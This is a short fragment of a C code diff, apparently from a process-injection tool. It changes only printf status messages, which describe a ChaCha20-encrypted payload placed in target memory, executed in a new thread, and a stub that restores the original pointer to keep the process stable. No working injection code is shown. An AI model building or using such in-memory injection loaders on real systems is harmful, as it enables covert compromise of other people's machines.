-    printf("[*] Stub auto-restores original pointer → process stays stable\n");
-    printf("[*] No threads created, no APCs queued — pure data overwrite\n\n");
+    printf("[*] Payload is ChaCha20 encrypted in target memory\n");
+    printf("[*] Decryption + execution happens in a new thread (Loader Lock safe)\n");
+    printf("[*] Stub auto-restores original pointer -- process stays stable\n\n");
 
     return 0;
 }
